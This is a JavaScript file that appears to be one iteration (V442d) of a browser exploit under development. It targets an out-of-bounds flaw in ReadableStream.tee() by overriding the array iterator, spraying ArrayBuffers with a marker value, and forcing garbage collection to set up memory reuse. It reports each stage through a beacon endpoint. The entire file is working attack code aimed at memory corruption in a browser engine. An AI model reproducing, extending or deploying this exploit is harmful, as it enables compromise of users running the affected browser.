/*
 * V442d -- ArrayBuffer Cross-Pollution for tee() OOB
 * FIX: V442c FR-TIMEOUT — var scoping leaks refs + eden-only GC.
 * NOW: Spray in isolated function (no leaked locals),
 *      object-based GC pressure (fills eden repeatedly),
 *      5-second wait for time-triggered full GC.
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V442-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        return {
          next: (function() {
            var items = [self[0]];
            var idx = 0;
            return function() {
              if (idx < items.length) return {value: items[idx++], done: false};
              return {done: true};
            };
          })()
        };
      }
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

function probe(val) {
  try {
    if (val === null || val === undefined) return "null";
    if (typeof val === "number") return "num:" + val;
    if (typeof val === "string") return "str:" + val.slice(0, 30);
    if (typeof val === "boolean") return "bool:" + val;
    if (typeof val === "object") {
      var name = val.constructor ? val.constructor.name : "?";
      return "obj:" + name;
    }
    return typeof val;
  } catch(e) { return "err:" + e.message.slice(0, 40); }
}

// FR setup — global so no closure captures spray locals
var frFired = false;
var fr = new FinalizationRegistry(function() { frFired = true; });

// Spray in ISOLATED function — all locals die when it returns
function doSpray(count, marker) {
  for (var i = 0; i < count; i++) {
    var ab = new ArrayBuffer(128);
    var dv = new DataView(ab);
    for (var j = 0; j < 128; j += 8) {
      dv.setFloat64(j, marker, true);
    }
    if (i === 0) fr.register(ab, "w");
    // ab and dv are overwritten next iteration
    // NOT stored in any array — each one becomes unreachable after next loop iter
    // except the last one (var scoped) but it dies when doSpray returns
  }
  // ab, dv go out of scope here
  return count;
}

// Heavy GC pressure — fill eden repeatedly to force full collection
function gcPressure() {
  for (var cycle = 0; cycle < 5; cycle++) {
    var arr = [];
    for (var i = 0; i < 50000; i++) {
      arr.push({a: i, b: "p" + (i & 0xFF)});
    }
    arr = null;
  }
  // Also some AB pressure
  var abs2 = [];
  for (var i = 0; i < 100; i++) {
    abs2.push(new ArrayBuffer(65536));
  }
  abs2 = null;
}

function doOobTee(prefix, cb) {
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue(prefix + "-oob"); c.close(); }
  });
  B(prefix + "-TEE-GO");
  try {
    var result = oobTee(oobRS);
    B(prefix + "-SURVIVED!!!");
    try { B(prefix + "-R0", probe(result[0])); } catch(e) {}
    try {
      B(prefix + "-R1-TYPE", typeof result[1]);
      B(prefix + "-R1-PROBE", probe(result[1]));
    } catch(e) { B(prefix + "-R1-ERR", e.message.slice(0,60)); }
    if (result[1] !== undefined && result[1] !== null) {
      try { B(prefix + "-R1-ISRS", String(result[1] instanceof ReadableStream)); } catch(e) {}
      try { B(prefix + "-R1-LOCKED", String(result[1].locked)); } catch(e) { B(prefix + "-R1-LOCKERR", e.message.slice(0,60)); }
      try {
        var ks = [];
        for (var k in result[1]) ks.push(k);
        B(prefix + "-R1-KEYS", ks.join(",").slice(0,80));
      } catch(e) {}
    }
  } catch(e) {
    B(prefix + "-TEE-ERR", e.message.slice(0,80));
  }
  B(prefix + "-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Main test: spray, pressure, wait for full GC, then tee
// ================================================================
B("RUNNING");

// Phase 1: Spray 512 ABs — all refs die inside doSpray
var sprayed = doSpray(512, 1.7004397903061394e-77); // 0x4242424242424242
B("SPRAYED", sprayed);

// Phase 2: Immediate GC pressure
gcPressure();
B("PRESSURE-1");

// Phase 3: Poll FR with 500ms intervals + pressure each round
var round = 0;
function poll() {
  round++;
  if (frFired) {
    B("FR-FIRED", "round=" + round);
    // AB backing stores are freed. Flush dealloc log with 128-byte fillers.
    var fillers = [];
    for (var i = 0; i < 64; i++) fillers.push(new ArrayBuffer(128));
    fillers = null;
    setTimeout(function() { doOobTee("T1", null); }, 50);
    return;
  }
  if (round <= 15) {
    gcPressure();
    B("POLL-" + round, "FR-NOT");
    setTimeout(poll, 500);
    return;
  }
  // 15 rounds × 500ms = 7.5 seconds — give up on FR, try anyway
  B("FR-TIMEOUT", "rounds=" + round);
  // Last-ditch: massive pressure
  for (var i = 0; i < 10; i++) gcPressure();
  setTimeout(function() {
    B("LAST-FR", frFired ? "FIRED" : "NOT");
    doOobTee("T1", null);
  }, 1000);
}

setTimeout(poll, 500);
})();
